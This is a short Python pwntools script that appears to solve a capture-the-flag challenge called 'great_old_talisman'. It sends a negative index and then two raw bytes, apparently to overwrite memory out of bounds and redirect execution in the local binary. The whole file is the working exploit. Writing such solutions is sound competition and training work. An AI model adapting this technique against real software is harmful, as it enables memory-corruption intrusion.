from pwn import *

elf = context.binary = ELF("./great_old_talisman")

r = process("./great_old_talisman")
r.recvuntil(b'Do you want to enchant it with a powerful spell? (1 -> Yes, 0 -> No)')
r.sendlineafter(b">> ",b'-4')

r.sendlineafter(b'Spell: ',b'\x5a\x13')

print(r.recvall())

r.close()
